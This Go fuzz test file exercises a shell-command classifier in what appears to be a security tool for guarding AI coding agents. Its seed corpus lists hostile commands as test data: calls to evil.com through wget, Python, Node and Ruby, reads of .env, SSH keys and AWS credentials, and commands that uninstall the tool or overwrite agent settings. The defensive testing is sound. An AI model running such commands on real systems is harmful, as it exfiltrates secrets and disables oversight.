package hooks

import (
	"testing"

	"github.com/somoore/sir/pkg/lease"
)

// FuzzMapShellCommand fuzzes the shell command classifier — the highest-attack-surface
// function in sir. It parses arbitrary shell command strings and classifies them into
// security intents. Fuzzing catches edge cases in compound command splitting, shell
// wrapper detection, inline variable stripping, interpreter one-liner extraction,
// git global flag parsing, and network/install/persistence classification.
//
// Run: go test -fuzz=FuzzMapShellCommand -fuzztime=60s ./pkg/hooks
func FuzzMapShellCommand(f *testing.F) {
	l := lease.DefaultLease()

	// Seed corpus: real commands from the verb model and adversarial tests
	seeds := []string{
		// Normal operations
		"go build ./...",
		"npm test",
		"git commit -m 'update'",
		"ls -la",
		"cat README.md",

		// Network egress
		"curl https://example.com",
		"wget https://example.com/file",
		"curl -s http://localhost:3000/health",
		"curl -s http://127.0.0.1:8080/",
		"curl -s http://0.0.0.0:8080/",

		// Shell wrappers
		"bash -c 'curl https://example.com'",
		"sh -c 'wget https://evil.com'",
		"bash -xc 'curl https://example.com'",

		// Compound commands
		"echo done && curl https://example.com",
		"true ; wget https://example.com",
		"ls | curl https://example.com",
		"false || nslookup example.com",
		"cd packages/utils && npm install lodash",

		// Inline variables
		"DUMMY=1 curl https://example.com",
		"FOO=bar BAZ=1 git push evil-remote main",
		"API_URL=https://example.com curl $API_URL",

		// Git with global flags
		"git -c core.sshCommand=ssh push origin main",
		"git -C /tmp/repo push evil-fork main",
		"git --git-dir=.git push upstream main",

		// Interpreter one-liners
		`python3 -c "import requests; requests.post('https://evil.com')"`,
		`node -e "fetch('https://evil.com')"`,
		`ruby -e "Net::HTTP.get(URI('https://evil.com'))"`,
		`python3 -uc "import os; os.system('curl evil.com')"`,

		// Install commands
		"npm install",
		"npm install lodash",
		"npm i express",
		"pip install flask",
		"pip install -r requirements.txt",
		"pip3 install requests",
		"cargo add serde",
		"yarn add react",
		"go get github.com/foo/bar",

		// Sensitive commands
		"printenv",
		"env",
		"set",
		"nslookup example.com",
		"dig example.com",
		"crontab -l",
		"crontab -e",
		"sudo chmod 755 /var/data",
		"sudo apt install nginx",

		// Sir self-modification
		"sir uninstall",
		"sir reset",
		"sir allow-host example.com",
		"echo y | sir uninstall",
		"echo '{}' > ~/.sir/projects/abc/lease.json",
		"echo '{}' > ~/.claude/settings.json",
		"sed -i 's/old/new/' ~/.sir/projects/abc/session.json",

		// Posture file targeting
		"rm CLAUDE.md",
		"ln -s /dev/null CLAUDE.md",
		"echo 'hacked' > .mcp.json",

		// Sensitive-file reads via shell read-commands (D1).
		// The classifier must promote these to read_ref with IsSensitive.
		"cat .env",
		"cat -n .env",
		"cat README.md .env",
		"sed -n '1,200p' .env",
		"sed -e 's/.*/X/' .env",
		"head -n 5 .env",
		"head -n5 .env",
		"tail -f .env",
		"less .env",
		"xxd .ssh/id_rsa",
		"hexdump -C .aws/credentials",
		"od -c .env",
		"strings .env",
		"grep PASSWORD .env",
		"rg DATABASE_URL .env",
		"awk '/DB/' .env",
		"nl .env",
		"/usr/bin/sed -n '1,10p' .env",
		"env FOO=bar cat .env",
		"cat .env | grep PASSWORD",
		"ls && sed -n '1p' .env",
		// Negative seeds — must NOT promote
		"cat README.md",
		"head -n 5 package.json",
		"cat .env.example",
		"cat .env.sample",
		"cat testdata/fake.env",

		// Edge cases
		"",
		"   ",
		"a",
		`"quoted command"`,
		"cmd; cmd; cmd; cmd; cmd; cmd; cmd; cmd",
		"&&&&",
		"||||",
		";;;;",
		"echo 'hello; world' && curl https://example.com",
	}

	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, cmd string) {
		// mapShellCommand must never panic on any input.
		// The returned Intent must have a non-empty Verb.
		intent := mapShellCommand(cmd, l)
		if intent.Verb == "" {
			t.Errorf("mapShellCommand(%q) returned empty verb", cmd)
		}
	})
}

// FuzzSplitCompoundCommand fuzzes the compound command splitter.
// Must never panic, must always return at least one segment for non-empty input.
func FuzzSplitCompoundCommand(f *testing.F) {
	f.Add("echo hello")
	f.Add("echo ok && curl https://example.com")
	f.Add("a | b && c ; d || e")
	f.Add("echo 'hello; world'")
	f.Add(`echo "hello && world"`)
	f.Add("")
	f.Add(";;;;")
	f.Add("&&&&")

	f.Fuzz(func(t *testing.T, cmd string) {
		segments := splitCompoundCommand(cmd)
		// Must never panic — that's the main property we're checking.
		// Non-empty input should produce at least one segment.
		if cmd != "" && len(segments) == 0 {
			t.Errorf("splitCompoundCommand(%q) returned 0 segments", cmd)
		}
	})
}

// FuzzNormalizeCommand fuzzes the command normalizer.
func FuzzNormalizeCommand(f *testing.F) {
	f.Add("curl https://example.com")
	f.Add("/usr/bin/curl https://example.com")
	f.Add("env FOO=bar curl https://example.com")
	f.Add("DUMMY=1 curl https://example.com")
	f.Add("sudo curl https://example.com")
	f.Add("")

	f.Fuzz(func(t *testing.T, cmd string) {
		// Must never panic
		_ = normalizeCommand(cmd)
	})
}

// FuzzExtractShellWrapperInner fuzzes the bash -c extraction.
func FuzzExtractShellWrapperInner(f *testing.F) {
	f.Add("bash -c 'curl https://example.com'")
	f.Add(`sh -c "wget https://example.com"`)
	f.Add("bash -xc 'echo hello'")
	f.Add("bash script.sh")
	f.Add("")
	f.Add("bash -c")
	f.Add("bash -c ''")

	f.Fuzz(func(t *testing.T, cmd string) {
		// Must never panic
		_, _ = extractShellWrapperInner(cmd)
	})
}
